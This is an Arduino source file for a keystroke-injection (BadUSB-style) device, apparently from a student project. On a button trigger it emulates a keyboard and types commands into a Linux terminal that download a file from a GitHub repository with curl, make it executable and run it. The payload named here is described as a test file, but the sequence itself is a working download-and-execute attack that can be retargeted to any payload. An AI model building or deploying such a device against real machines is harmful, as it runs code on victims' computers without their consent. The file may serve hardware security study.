/* 
Linux injection sequence
Injects commands to open a terminal, download a file from Github, and run the file

Keystroke sequence:
- Open terminal
- Change directory
- Download file
- Run file
*/
#include <Keyboard.h>

int hasRun = 0;

// test sl file
String download = "curl -O https://raw.githubusercontent.com/olincollege/VexWare/master/src/test";
String run = "./test";

void setup() {
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() {
  delay(800);
  if (digitalRead(2) == LOW) {
    if (hasRun == 0) {
    // Begin keystroke sequence
    // Open terminal
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');
    Keyboard.releaseAll();
    delay(500); // let animation play

    // Try another shortcut
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play   

    // Change directory
    Keyboard.print("cd ~/Desktop");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play

    // Download file
    Keyboard.print(download);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play

    // Run file
    Keyboard.print("chmod +x test");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);

    Keyboard.print(run);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play

    //Keyboard.end(); // end keyboard emulation
    hasRun = 1;
    }
  }
}
